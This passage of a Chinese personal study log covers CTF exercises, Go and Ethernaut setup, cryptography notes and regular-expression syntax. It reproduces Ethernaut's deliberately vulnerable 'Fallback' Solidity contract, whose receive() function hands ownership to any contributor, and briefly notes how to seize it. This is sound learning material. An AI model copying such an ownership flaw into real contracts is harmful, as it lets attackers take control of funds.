fa2a8ab0fadb4854943df690335a99b5</span><br><span class="line">------------------------------------------------</span><br><span class="line">3a5648f7de99c4f87331c36983fc8adcd667743569a19c8dafdd5e8a33de154d</span><br><span class="line">------------------------------------------------</span><br><span class="line">08229f4052dde89671134f1784bed2d6</span><br><span class="line">------------------------------------------------</span><br><span class="line">flag&#123;898161df-fabf-4757-82b6-ffe407c69475&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//seed init</span></span><br><span class="line">	loc, _ := time.LoadLocation(<span class="string">&quot;Local&quot;</span>)</span><br><span class="line">	timeObj, _ := time.ParseInLocation(</span><br><span class="line">		<span class="string">&quot;2006-01-02 15:04:05&quot;</span>,</span><br><span class="line">		<span class="string">&quot;2022-07-19 14:49:56&quot;</span>, loc)</span><br><span class="line">	seed := timeObj.Unix()</span><br><span class="line">	rand.Seed(seed)</span><br><span class="line"></span><br><span class="line">	input, _ := os.Open(<span class="string">&quot;./src.png&quot;</span>)</span><br><span class="line">	in := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">70475</span>)</span><br><span class="line">	lenx, _ := input.Read(in)</span><br><span class="line">	table := <span class="built_in">make</span>([]<span class="type">int</span>, lenx)</span><br><span class="line">	out := <span class="built_in">make</span>([]<span class="type">byte</span>, lenx)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; lenx; i++ &#123;</span><br><span class="line">		table[i] = i</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//shuffle</span></span><br><span class="line">	rand.Shuffle(<span class="built_in">len</span>(table), <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">		table[i], table[j] = table[j], table[i]</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; lenx; i++ &#123;</span><br><span class="line">		out[table[i]] = in[i]</span><br><span class="line">	&#125;</span><br><span class="line">	output, _ := os.Create(<span class="string">&quot;./flag.png&quot;</span>)</span><br><span class="line">	output.Write(out)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="vscode安装配置golang环境"><a href="#vscode安装配置golang环境" class="headerlink" title="vscode安装配置golang环境"></a>vscode安装配置golang环境</h2><h3 id="安装go"><a href="#安装go" class="headerlink" title="安装go"></a>安装go</h3><ul>
<li>官网下载，但应该需要科学，找了个中文网进行下载了。<a href="https://studygolang.com/dl">Go下载 - Go语言中文网 - Golang中文社区 (studygolang.com)</a></li>
<li>直接一路<code>Next</code>下载，最终安装在C盘了。</li>
<li>命令行输入<code>go version</code>，输出如下即表示安装成功。</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230421141717886.png" class="" title="image-20230421141717886">

<h3 id="vs配置go环境"><a href="#vs配置go环境" class="headerlink" title="vs配置go环境"></a>vs配置go环境</h3><p>为保证环境能够正常安装下载go插件，需要执行两条命令。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> env -w GO111MODULE=on</span><br><span class="line"><span class="keyword">go</span> env -w GOPROXY=https:<span class="comment">//goproxy.cn,direct</span></span><br></pre></td></tr></table></figure>

<img src="/2023/12/31/WeeklyStudy/image-20230421142201384.png" class="" title="image-20230421142201384">

<p>验证一下，使用命令<code>go env</code>。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230421142818010.png" class="" title="image-20230421142818010">

<p>无语，最终测试成功了，写的测试代码一直失败，不知道问题出现在哪里了。</p>
<p>后来发现，行吧，单引号跟双引号在<code>go</code>环境中严格区分。</p>
<p>而且运行代码之前一定要保存文件，要不然胡直接报错。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello go world!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/12/31/WeeklyStudy/image-20230421143648479.png" class="" title="image-20230421143648479">

<h1 id="230424"><a href="#230424" class="headerlink" title="230424"></a>230424</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR</span><br><span class="line">	w --- x --- y --- z</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gantt</span><br><span class="line">        dateFormat  YYYY-MM-DD</span><br><span class="line"></span><br><span class="line">        title 软件开发甘特图</span><br><span class="line"></span><br><span class="line">        section 设计</span><br><span class="line">        需求:done,des1, 2019-01-06,2019-01-08</span><br><span class="line">        原型:active,des2, 2019-01-09, 3d</span><br><span class="line">        UI设计:des3, after des2, 5d</span><br><span class="line">        未来任务:des4, after des3, 5d</span><br><span class="line"></span><br><span class="line">        section 开发</span><br><span class="line">        学习准备理解需求:crit, done, 2019-01-06,24h</span><br><span class="line">        设计框架:crit, done, after des2, 2d</span><br><span class="line">        开发:crit, active, 3d</span><br><span class="line">        未来任务:crit, 5d</span><br><span class="line">        休息时间:2d</span><br><span class="line"></span><br><span class="line">        section 测试</span><br><span class="line">        功能测试:active, a1, after des3, 3d</span><br><span class="line">        压力测试:after a1, 20h</span><br><span class="line">        测试报告: 48h</span><br></pre></td></tr></table></figure>

<h2 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a>Ethernaut</h2><blockquote>
<p><a href="https://ctf-wiki.org/blockchain/ethereum/selector-encoding/">Function Selector and Argument Encoding - CTF Wiki (ctf-wiki.org)</a></p>
</blockquote>
<h3 id="安装MetaMask"><a href="#安装MetaMask" class="headerlink" title="安装MetaMask"></a>安装MetaMask</h3><ul>
<li>谷歌下载插件，容易因为后台更新导致直接把安装的插件给清除，因为默认安装的插件都是不安全的。</li>
<li>于是跑去火狐下载插件了，火狐浏览器版本问题导致无法验证插件压缩包的签名，无法安装。但火狐能够浏览器内下载插件，现在勉强还是能用。</li>
</ul>
<h3 id="打开浏览器console"><a href="#打开浏览器console" class="headerlink" title="打开浏览器console"></a>打开浏览器console</h3><img src="/2023/12/31/WeeklyStudy/image-20230424144239884.png" class="" title="image-20230424144239884">

<p>打开控制台看到的界面。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230424143809546.png" class="" title="image-20230424143809546">

<p>这个应该该<code>level</code>的<code>token</code>。</p>
<p>然后可以通过<code>player</code>查看自己的<code>token</code>。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230424143933799.png" class="" title="image-20230424143933799">

<p><em>话说这个要导入吗……emm，暂且先不导入啥的，继续往下看看吧。</em></p>
<h3 id="使用console-help"><a href="#使用console-help" class="headerlink" title="使用console help()"></a>使用console help()</h3><img src="/2023/12/31/WeeklyStudy/image-20230424144331871.png" class="" title="image-20230424144331871">

<p>调用<code>help()</code>直接查看大概的函数。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230424144706384.png" class="" title="image-20230424144706384">

<img src="/2023/12/31/WeeklyStudy/image-20230424144721819.png" class="" title="image-20230424144721819">

<h3 id="智能合约？"><a href="#智能合约？" class="headerlink" title="智能合约？"></a>智能合约？</h3><blockquote>
<p><a href="https://docs.soliditylang.org/en/latest/">Solidity — Solidity 0.8.20 documentation (soliditylang.org)</a></p>
<p><a href="http://remix.ethereum.org/#optimize=false&amp;runs=200&amp;evmVersion=null">http://remix.ethereum.org/#optimize=false&amp;runs=200&amp;evmVersion=null</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230424145447477.png" class="" title="image-20230424145447477">

<p>火狐调用的话，好像是<code>ethereum</code>。</p>
<p><em>emm，先往下继续看看。</em></p>
<p><em>不太对，火狐应该调用的函数不变，但不知道为什么火狐无法调用。</em></p>
<p><em><strong>emm，似乎因为没有测试币导致无法new instance，不是吧不是吧，真是这种神奇原因嘛？？？</strong></em></p>
<img src="/2023/12/31/WeeklyStudy/image-20230424171144656.png" class="" title="image-20230424171144656">

<p><em>真好，去水龙头那整测试币，肉眼可见电脑快窒息挂机了。</em></p>
<h1 id="230425"><a href="#230425" class="headerlink" title="230425"></a>230425</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">如果16进制是小写的形式，注意第2个参数要变成True</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">hexstr = <span class="string">&#x27;2f2f3130322f2f3130382f2f39372f2f3130332f2f3132332f2f35372f2f35322f2f35322f2f3130322f2f39392f2f3130322f2f39392f2f35332f2f35302f2f39372f2f3130322f2f39372f2f3130302f2f35362f2f35362f2f34382f2f35322f2f35302f2f35352f2f35342f2f39392f2f3130312f2f34392f2f35372f2f39392f2f35312f2f35352f2f35302f2f3130302f2f35342f2f35302f2f35372f2f313235&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">charstr = base64.b16decode(hexstr, <span class="literal">True</span>).decode()</span><br><span class="line">flag_list = charstr.split(<span class="string">&#x27;//&#x27;</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="comment"># print(flag_list)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_list:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="现代密码学及数字加密技术"><a href="#现代密码学及数字加密技术" class="headerlink" title="现代密码学及数字加密技术"></a>现代密码学及数字加密技术</h2><ul>
<li>现代密码学介绍</li>
<li>对称&#x2F;非对称加密算法</li>
<li>消息摘要&#x2F;数字签名算法</li>
</ul>
<p>$$<br>signature_A \equiv H(M)^{d1} \mod n1<br>$$</p>
<p>$$<br>verify \equiv (signature_A)^{e1} \mod n1<br>$$</p>
<h2 id="Eth准备？"><a href="#Eth准备？" class="headerlink" title="Eth准备？"></a>Eth准备？</h2><p>测试币啊测试币。</p>
<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TWO-targets"><a href="#TWO-targets" class="headerlink" title="TWO targets"></a>TWO targets</h3><ul>
<li>you claim ownership of the contract</li>
<li>you reduce its balance to 0</li>
</ul>
<p><em>第一个即拿到该合约的所有权，<code>receive()</code>函数给合约转一笔账，所有者即变成自己。</em></p>
<p>倒推以下：<code>reveive() &lt;- contributions() &lt;- </code></p>
<p>窒息，烦死，被ban了好烦人。</p>
<p>回家用电脑整活吧嗨。</p>
<h1 id="230516"><a href="#230516" class="headerlink" title="230516"></a>230516</h1><img src="/2023/12/31/WeeklyStudy/image-20230516092945918.png" class="" title="image-20230516092945918">

<img src="/2023/12/31/WeeklyStudy/image-20230516094834387.png" class="" title="image-20230516094834387">

<img src="/2023/12/31/WeeklyStudy/image-20230516094848524.png" class="" title="image-20230516094848524">

<img src="/2023/12/31/WeeklyStudy/image-20230516094917443.png" class="" title="image-20230516094917443">

<img src="/2023/12/31/WeeklyStudy/image-20230516094935039.png" class="" title="image-20230516094935039">



<img src="/2023/12/31/WeeklyStudy/image-20230516101933511.png" class="" title="image-20230516101933511">



<img src="/2023/12/31/WeeklyStudy/image-20230516102023594.png" class="" title="image-20230516102023594">

<img src="/2023/12/31/WeeklyStudy/image-20230516105302029.png" class="" title="image-20230516105302029">

<p>用户A先选择一条椭圆曲线$E_q(a, b)$，然后选择其上的一个生成元G，假设其阶为$n$，之后再选择一个正整数$n_a$作为密钥，计算$P_a &#x3D; n_a G$。</p>
<p>其中，$E_q(a, b)$，$q$，$G$都会被公开。</p>
<p>公钥为$P_a$，私钥为$n_a$。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">椭圆曲线加密，加解密过程：</span><br><span class="line">椭圆曲线Ep(a,b)（p为模数），基点G(x,y)，G点的阶数n，私钥k，公钥K(x,y)，随机整数r，明文为一点m(x,y)，密文为两点c1(x,y)和c2(x,y)</span><br><span class="line">（其中基点G，明文m，密文c1、c2都是椭圆曲线E上的点）</span><br><span class="line">选择私钥k（k&lt;n）</span><br><span class="line">得到公钥K = k*G</span><br><span class="line">选择随机整数r（r&lt;n）</span><br><span class="line">加密：</span><br><span class="line">c1 = m+r*K</span><br><span class="line">c2 = r*G</span><br><span class="line">解密：m = c1-k*c2</span><br></pre></td></tr></table></figure>

<h1 id="230525"><a href="#230525" class="headerlink" title="230525"></a>230525</h1><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>各自拿硬币</p>
<ul>
<li>++ 3</li>
<li>– 1</li>
<li>+- (-2)</li>
</ul>
<p><strong>亮硬币</strong>，赢面为50%。</p>
<p>proof：<br>$$<br>\frac{1}{4} \times 3 + \frac{1}{4} \times 1 + \frac{1}{2}\times (-2) &#x3D; 0<br>$$<br>假定：</p>
<table>
<thead>
<tr>
<th>人员</th>
<th>正面</th>
<th>反面</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>$\frac{3}{8}$</td>
<td>$\frac{5}{8}$</td>
</tr>
<tr>
<td>B</td>
<td>$x$</td>
<td>$1-x$</td>
</tr>
</tbody></table>
<p>预期：</p>
<table>
<thead>
<tr>
<th>情况</th>
<th>概率</th>
<th>收入</th>
</tr>
</thead>
<tbody><tr>
<td>正正</td>
<td>$\frac{3}{8}x$</td>
<td>3</td>
</tr>
<tr>
<td>正反</td>
<td>$\frac{3}{8}(1-x)$</td>
<td>-2</td>
</tr>
<tr>
<td>反正</td>
<td>$\frac{5}{8}x$</td>
<td>-2</td>
</tr>
<tr>
<td>反反</td>
<td>$\frac{5}{8}(1-x)$</td>
<td>1</td>
</tr>
</tbody></table>
<p>计算的预期为$-\frac{1}{8}$，等于说每轮都在亏损。</p>
<h1 id="230531"><a href="#230531" class="headerlink" title="230531"></a>230531</h1><h2 id="OTP-MTP攻击"><a href="#OTP-MTP攻击" class="headerlink" title="OTP-MTP攻击"></a>OTP-MTP攻击</h2><img src="/2023/12/31/WeeklyStudy/image-20230531102653629.png" class="" title="image-20230531102653629">

<h2 id="Coppersmith-Short-pad攻击"><a href="#Coppersmith-Short-pad攻击" class="headerlink" title="Coppersmith-Short pad攻击"></a>Coppersmith-Short pad攻击</h2><img src="/2023/12/31/WeeklyStudy/image-20230531105043543.png" class="" title="image-20230531105043543">

<h1 id="230601"><a href="#230601" class="headerlink" title="230601"></a>230601</h1><h2 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h2><h3 id="安装Rust"><a href="#安装Rust" class="headerlink" title="安装Rust"></a>安装Rust</h3><p>步骤忘记录了，直接查看是否运行成功。</p>
<p><em>已转移。</em></p>
<h1 id="230605"><a href="#230605" class="headerlink" title="230605"></a>230605</h1><h2 id="数据处理-1"><a href="#数据处理-1" class="headerlink" title="数据处理"></a>数据处理</h2><p>涉及数据脱敏，数据查找等相关代码算法。</p>
<h2 id="数据生命周期"><a href="#数据生命周期" class="headerlink" title="数据生命周期"></a>数据生命周期</h2><h3 id="静态数据生命周期"><a href="#静态数据生命周期" class="headerlink" title="静态数据生命周期"></a>静态数据生命周期</h3><img src="/2023/12/31/WeeklyStudy/image-20230605092655302.png" class="" title="image-20230605092655302">

<h3 id="动态数据生命周期"><a href="#动态数据生命周期" class="headerlink" title="动态数据生命周期"></a>动态数据生命周期</h3><img src="/2023/12/31/WeeklyStudy/image-20230605092734244.png" class="" title="image-20230605092734244">

<h2 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h2><ul>
<li>数据传输三要素</li>
</ul>
<h1 id="230609"><a href="#230609" class="headerlink" title="230609"></a>230609</h1><h2 id="切割图片"><a href="#切割图片" class="headerlink" title="切割图片"></a>切割图片</h2><blockquote>
<p><a href="https://imgtool.net/imagesplit/">图片分割 - 图文工具箱 - imgtool.net</a></p>
</blockquote>
<h2 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">montage *.png -tile 10x10 -geometry +0+0 flag.png</span><br></pre></td></tr></table></figure>

<ul>
<li>10×10，表示该图片大小，理论上应该有100张图片</li>
<li>+0+0，表示边框为0，通常情况下使用该命令</li>
</ul>
<h1 id="230625"><a href="#230625" class="headerlink" title="230625"></a>230625</h1><h2 id="精通正则表达式"><a href="#精通正则表达式" class="headerlink" title="精通正则表达式"></a>精通正则表达式</h2><p><img src="/../../../Desktop/24-04-02-lyjh/regex.jpg" alt="img"></p>
<p><em>匹配：至少一位数字（0到9的任意组合）开始，接下来是字符a，接下来是字符b，最后以字符c结尾。</em></p>
<p>完整的正则表达式由两种字符构成。特殊字符称为”<strong>元字符</strong>“，其他为<strong>普通文本字符</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 上面图片举例</span><br><span class="line">普通字符：0 9 a b c</span><br><span class="line">元字符：^ [ ] - + $</span><br></pre></td></tr></table></figure>

<p><em>读正则表达式时<strong>遇到元字符将他解释成为其对应的普通字符</strong>，这样就能够理解记忆而不是死记硬背。</em></p>
<h3 id="行的起始与结束"><a href="#行的起始与结束" class="headerlink" title="行的起始与结束"></a>行的起始与结束</h3><ul>
<li><code>^</code>：用于将匹配文本锚定在一行的开头</li>
<li><code>$</code>：用与将匹配文本锚定在一行的结尾</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^cat 匹配以c作为一行的第一个字符，紧接着一个a, 紧接着一个t的文本</span><br><span class="line">cat$ 匹配以字符cat为一行结尾的文本</span><br><span class="line">^$ 匹配空行，没有任何字符</span><br></pre></td></tr></table></figure>

<h3 id="字符组与排除字符组"><a href="#字符组与排除字符组" class="headerlink" title="字符组与排除字符组"></a>字符组与排除字符组</h3><ul>
<li><code>[]</code>：匹配方括号中的若干字符之一</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gr[ae]y 匹配字符串gray 或者 grey</span><br><span class="line">H[1-6] 字符组元字符&#x27;-&#x27;表示一个范围，匹配H1,H2,H3,H4,H5,H6</span><br><span class="line">[0-9A-Z_!.?] 匹配一个数字，大写字母，下划线，惊叹号，点号，或者是问号</span><br><span class="line">[-_.?] 匹配连字符，下划线，点号，问号</span><br></pre></td></tr></table></figure>

<p><strong>TIPS：</strong></p>
<ul>
<li><p>字符组以外的普通字符都有“接下来是”的意思，字符组的内容是在同一个位置能够匹配若干字符，它的意思是“或”。</p>
</li>
<li><p>连字符<code>-</code>只有在字符组内部并且没有出现在字符组的开头，它才是字符组元字符, 用来表示一个范围，否则它就只能匹配普通的连字符号。</p>
</li>
<li><p>字符<code>. ?</code> 在字符组外是元字符，但在字符组内他们都被当作普通字符。</p>
</li>
<li><p><code>[^]</code>：匹配一个除了括号中任何未列出的字符</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[^1-6] 匹配除了1到6以外的任何字符</span><br><span class="line">q[^u] 匹配q后面紧接着一个除了u以为的任何一个字符</span><br></pre></td></tr></table></figure>

<h3 id="用点号匹配任意字符"><a href="#用点号匹配任意字符" class="headerlink" title="用点号匹配任意字符"></a>用点号匹配任意字符</h3><ul>
<li><code>.</code>：匹配任意字符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">03[-./]19[-./]76 匹配03-19-76, 03.19.76, 03/19/76</span><br><span class="line">03.19.76 匹配03-19-76, 03.19.76, 03/19/76</span><br></pre></td></tr></table></figure>

<p>TIPS：</p>
<ul>
<li><p>在字符组中的.并不是元字符，而是普通字符点号</p>
</li>
<li><p>在字符组中的-也不是元字符，因为它在字符组的第一个位置</p>
</li>
<li><p>在字符组外的.是一个元字符，可以匹配任意字符包括普通字符点号</p>
</li>
<li><p>第一个匹配更加精确，但是更难读，也更难写。第二个匹配更容易理解，但是不够细致。使用哪一个正则表达式，取决于你对检索文本的了解，以及你需要达到的准确程度。写正则表达式时，我们需要在对欲检索文本的了解程度与检索精确性之间求得平衡。</p>
</li>
</ul>
<h3 id="多选结构"><a href="#多选结构" class="headerlink" title="多选结构"></a>多选结构</h3><ul>
<li><code>|</code>：匹配分割两边的任意一个表达式</li>
<li><code>()</code>：划定多选结构的作用范围</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 匹配grey 或者 gray</span><br><span class="line">gr[ea]y</span><br><span class="line">grey|gray</span><br><span class="line">gr(a|e)y</span><br><span class="line"></span><br><span class="line"># 匹配Jeffrey 或者Jeffery</span><br><span class="line">Jeffrey|Jeffery </span><br><span class="line">Jeff(rey|ery)</span><br><span class="line">Jeff(re|er)y</span><br><span class="line"></span><br><span class="line"># 匹配以From,Subject或者Date开头紧跟着冒号的字符串</span><br><span class="line">^(From|Subject|Date):</span><br></pre></td></tr></table></figure>

<p><strong>TIPS：</strong></p>
<ul>
<li>一个字符组只能匹配目标文本中的单个字符，而每个多选结构自身都可能是完整的正则表达式，都可以匹配任意长度的文本。</li>
<li>字符组基本可以算是一门独立的微型语言，对于元字符，它们有自己的规定。而多选结构是正则表达式语言主体的一部分。</li>
</ul>
<h3 id="单词分界符"><a href="#单词分界符" class="headerlink" title="单词分界符"></a>单词分界符</h3><ul>
<li><code>\&lt;</code>：匹配单词的起始位置</li>
<li><code>\&gt;</code>：匹配单词的结束位置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&lt;cat\&gt; 匹配单词cat</span><br></pre></td></tr></table></figure>

<p><strong>TIPS：</strong></p>
<ul>
<li><code>&lt;</code>和<code>&gt;</code>本身并不是元字符，只有当它们与斜线结合起来的时候，整个序列才具有特殊意义，它们被称为<strong>元字符序列</strong>。</li>
<li>在某些语言或者工具中<code>\b</code> 用来表示单词分界符</li>
</ul>
<h3 id="可选项元素"><a href="#可选项元素" class="headerlink" title="可选项元素"></a>可选项元素</h3><ul>
<li><code>?</code>：表示在它之前的字符可有可无</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">colou?r  匹配color 或者 colour</span><br><span class="line">July? 匹配Jul 或者 July</span><br></pre></td></tr></table></figure>

<h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><ul>
<li><code>+</code> 在它之前紧邻的元素出现一次或任意多次</li>
<li><code>*</code> 在它之前紧邻的元素出现任意多次或者不出现</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;hr +size=[0-9]+ *&gt; 匹配在size之前至少有一个空格，在=之后至少有一个数字，在&gt;之前有任意多个空格</span><br></pre></td></tr></table></figure>

<ul>
<li>匹配优先量词 (匹配尽可能多的内容)<br><code>* + ? &#123;min, max&#125;</code></li>
<li>忽略优先量词 (匹配尽可能少的内容)<br><code>*? +? ?? &#123;min, max&#125;?</code></li>
<li>占有优先量词 (类似固化分组，一旦匹配到某些内容就固定下来不会交还)<br><code>*+ ++ ?+ &#123;min, max&#125;+</code></li>
</ul>
<h3 id="区间量词"><a href="#区间量词" class="headerlink" title="区间量词"></a>区间量词</h3><ul>
<li><code>&#123;min, max&#125;</code> 表示在它之前的元素最少出现min次，最多出现max次</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a-zA-Z]&#123;1,5&#125; 匹配1到5个大小写字母</span><br></pre></td></tr></table></figure>

<h3 id="分组与反向引用"><a href="#分组与反向引用" class="headerlink" title="分组与反向引用"></a>分组与反向引用</h3><ul>
<li><code>()</code> 捕获分组,能够记住子表达式匹配的文本</li>
<li><code>\1</code> 引用第一组圆括号匹配的文本</li>
<li><code>\2</code> 引用第二组圆括号匹配的文本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&lt;([A-Za-z]+) +\1\&gt;  匹配重复的单词，如 the the</span><br><span class="line">([a-z])([0-9])\1\2 匹配一个字母紧接一个数字，接下来重复之前匹配的字母和匹配的数字 如：a1a1</span><br></pre></td></tr></table></figure>

<ul>
<li>非捕获型分组 <code>(?:)</code><br>表示只分组不捕获, 提高匹配效率并且无法引用匹配内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(?:[a-z])</span><br></pre></td></tr></table></figure>

<ul>
<li>命名捕获分组 <code>(?&lt;Name&gt;)</code><br>给分组命名为Area</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(?&lt;Area&gt;\d\d\d)</span><br></pre></td></tr></table></figure>

<ul>
<li>固化分组 <code>(?&gt;)</code><br>固化已经捕获的内容不会再改变</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i.*! 可以匹配iHola!</span><br><span class="line">i(?&gt;.*)! 无法匹配iHola! 由于正则引擎匹配时，*已经匹配到!, 已经固化，无法再撤销重新匹配</span><br></pre></td></tr></table></figure>

<ul>
<li><p>条件判断 <code>(?if then |else)</code><br>if 部分为特殊的条件表达式，then 和else 部分为普通的子表达式，如果if部分测试为真，则尝试then的表达式，否则尝试else部分。else 部分也可以不出现，并且省略<code>|</code>。<br>if部分因正则流派不同而不同，但大多数都容许在其中引用捕获的子表达式和环视结构。</p>
<ul>
<li>使用引用作为if条件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">( &lt;A\s+[^&gt;]+&gt; \s* )? # 匹配开头的&lt;A&gt; tag, 如果存在的话</span><br><span class="line">&lt;IMG\s+[^&gt;]+&gt; # 匹配&lt;IMG&gt; tag</span><br><span class="line">(?(1)\s*&lt;/A&gt;) # 匹配结尾的&lt;/A&gt;, 如果之前匹配过&lt;A&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用环视结构作为if条件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(?(?&lt;=NUM:)\d+|\w+)  // 它会在NUM: 之后的位置尝试匹配\d+, 但是在其他位置尝试使用\w+</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h3><p>在元字符前面使用反斜线称为<strong>转义符</strong>。</p>
<ul>
<li><code>\.</code> 转义点号，使它失去元字符的含义，表示一个普通的点号字符</li>
<li><code>\(</code> 转义圆括号，使它失去分组的作用，作为普通字符的字符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\([a-zA-Z]+\) 匹配在一个括号内的单词如: (very)</span><br></pre></td></tr></table></figure>

<h3 id="环视结构"><a href="#环视结构" class="headerlink" title="环视结构"></a>环视结构</h3><p>环视结构不占用字符，只匹配文本中的特定位置，类似与^匹配行的开头位置</p>
<ul>
<li><code>(?=)</code> 肯定顺序环视，子表达式能够匹配右侧文本则匹配位置成功</li>
<li><code>(?!)</code> 否定顺序环视，子表达式不能匹配右侧文本则匹配位置成功</li>
<li><code>(?&lt;=)</code> 肯定逆序环视，子表达式能够匹配左侧文本则匹配位置成功</li>
<li><code>(?&lt;!)</code> 否定逆序环视，子表达式不能匹配左侧文本则匹配位置成功</li>
</ul>
